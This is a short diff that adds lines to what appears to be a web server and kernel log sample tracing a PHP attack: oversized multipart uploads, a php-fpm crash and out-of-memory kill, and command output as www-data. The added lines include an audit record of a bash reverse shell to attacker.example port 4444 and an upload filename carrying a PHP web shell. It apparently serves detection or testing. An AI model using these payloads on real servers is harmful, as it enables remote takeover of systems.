@@ -30,3 +30,9 @@ HTTP/1.1 200 OK response body marker <<<P2S>>>uid=33(www-data)
 [Wed Oct 27 04:13:01 2026] [php:warn] [pid 1:tid 1] [client 10.0.0.5:5660] PHP Warning:  POST Content-Length of 134217728 bytes exceeds the limit of 8388608 bytes in Unknown on line 0
 [Wed Oct 27 04:13:02 2026] [php:warn] [pid 1:tid 1] [client 10.0.0.5:5661] PHP Warning:  Unknown: Multipart body parts limit exceeded 1000. in Unknown on line 0
 10.0.0.5 - - [27/Oct/2026:04:13:03 +0700] "GET /?q0000000=v&q0000001=v&q0000002=v HTTP/1.1" 200 512 "-" "-"
+Oct 27 04:14:00 web01 kernel: php-fpm8.2[991]: segfault at 7f00 ip 00007f00 sp 00007ffe error 4 in php-fpm8.2[55+0x1000]
+Oct 27 04:14:01 web01 kernel: Out of memory: Killed process 991 (php-fpm8.2) total-vm:123456kB, anon-rss:51200kB
+Content-Disposition: form-data; name="PHPSESSID_EXTRA"
+Content-Type: multipart/form-data; boundary="SSSSSSSSSSSSSSSSS"
+Oct 27 04:14:04 web01 audit: type=EXECVE msg=audit(1:102): argc=3 a0="/bin/bash" a1="-i" a2=">& /dev/tcp/attacker.example/4444 0>&1" exe="/usr/sbin/php-fpm8.4"
+Content-Disposition: form-data; name="f"; filename="%3C%3Fphp system($_GET[1]); ?>"
